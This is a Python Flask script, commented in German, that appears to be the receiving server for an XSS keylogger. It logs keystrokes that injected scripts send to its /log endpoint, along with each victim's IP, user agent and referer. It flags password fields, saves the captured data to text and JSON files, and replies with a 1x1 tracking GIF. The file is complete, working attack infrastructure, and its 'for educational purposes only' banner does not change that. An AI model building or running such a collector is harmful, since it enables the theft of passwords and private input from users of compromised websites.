#!/usr/bin/env python3
"""
XSS KEYLOGGER SERVER - FINAL VERSION
Basiert auf dem funktionierenden Server des Kollegen
Verwendet flask_cors wie der Kollege!
"""

from flask import Flask, request
from flask_cors import CORS
from datetime import datetime
import os
from pathlib import Path

app = Flask(__name__)

# CORS aktivieren - GENAU wie beim Kollegen!
CORS(app, resources={r"/*": {"origins": "*"}})

# Dateien für Logging
KEYLOG_FILE = "results/keylogger_log.txt"
KEYLOG_JSON = "results/captured_keystrokes.json"

BANNER = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║           ⌨️  KEYLOGGER SERVER GESTARTET ⌨️              ║
║                                                          ║
║  Port: 8889                                              ║
║  Endpoint: /log (GET)                                    ║
║                                                          ║
║  ⚠️  NUR FÜR BILDUNGSZWECKE                              ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""

keystrokes = []

def log_to_file(filename, message):
    """Hilfsfunktion zum Schreiben in Logdateien"""
    # Erstelle Verzeichnis falls nicht vorhanden
    Path(filename).parent.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

@app.route("/")
def index():
    """Statusseite"""
    return f"""
    <h1>⌨️ Keylogger Server</h1>
    <p>Status: <span style="color:green">ONLINE</span></p>
    <h2>Stats:</h2>
    <ul>
        <li>Total Keystrokes: {len(keystrokes)}</li>
    </ul>
    <p><strong>⚠️ NUR FÜR BILDUNGSZWECKE</strong></p>
    """, 200

@app.route("/log", methods=["GET", "POST", "OPTIONS"])
def log_keystroke():
    """
    Endpoint zum Empfangen von Keystrokes
    Akzeptiert: k (key), f (field), s (session_id)
    """
    # Keystroke aus GET-Parametern holen
    key = request.args.get("k", "")
    field = request.args.get("f", "unknown")
    session_id = request.args.get("s", "default")

    victim_ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "Unknown")

    if key:
        # Keystroke-Daten
        keystroke_data = {
            "timestamp": datetime.now().isoformat(),
            "key": key,
            "field": field,
            "session_id": session_id,
            "ip": victim_ip,
            "user_agent": user_agent,
            "referer": referer
        }

        keystrokes.append(keystroke_data)

        # Console output
        is_password = 'password' in field.lower()
        icon = "🔑" if is_password else "⌨️"
        print(f"{icon} [{field:15}] {key}", end='', flush=True)

        # Log in Datei
        log_message = f"IP: {victim_ip} | Field: {field} | Key: {key} | Session: {session_id}"
        log_to_file(KEYLOG_FILE, log_message)

        # Speichere alle 10 Keystrokes
        if len(keystrokes) % 10 == 0:
            save_keystrokes()

        # Return 1x1 GIF (wie Cookie-Stealer)
        gif_data = (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
            b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00'
            b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02'
            b'\x44\x01\x00\x3b'
        )
        return gif_data, 200, {'Content-Type': 'image/gif'}

    return "", 200

@app.route("/status")
def status():
    """Status Endpoint"""
    return {
        "status": "running",
        "total_keystrokes": len(keystrokes),
        "server": "Keylogger FINAL"
    }, 200

def save_keystrokes():
    """Speichere Keystrokes in JSON"""
    import json
    Path(KEYLOG_JSON).parent.mkdir(parents=True, exist_ok=True)

    with open(KEYLOG_JSON, 'w', encoding='utf-8') as f:
        json.dump({
            "metadata": {
                "server": "KeyloggerServerFinal",
                "timestamp": datetime.now().isoformat()
            },
            "keystrokes": keystrokes,
            "statistics": {
                "total_keystrokes": len(keystrokes)
            }
        }, f, indent=2, ensure_ascii=False)

if __name__ == "__main__":
    # Banner anzeigen
    print(BANNER)

    # Logdateien initialisieren
    Path(KEYLOG_FILE).parent.mkdir(parents=True, exist_ok=True)
    if not os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, "w") as f:
            f.write(f"# Keylogger Log - Erstellt: {datetime.now()}\n")

    print("📝 Logdateien:")
    print(f"   • Keylogs TXT: {os.path.abspath(KEYLOG_FILE)}")
    print(f"   • Keylogs JSON: {os.path.abspath(KEYLOG_JSON)}")
    print("\n🚀 Server startet...\n")
    print(f"LEGENDE: ⌨️  = Normal | 🔑 = Password-Feld")
    print(f"{'-'*70}\n")

    # Server auf Port 8889 starten - GENAU wie beim Kollegen!
    app.run(
        debug=True,
        host='0.0.0.0',
        port=9999,
        threaded=True
    )
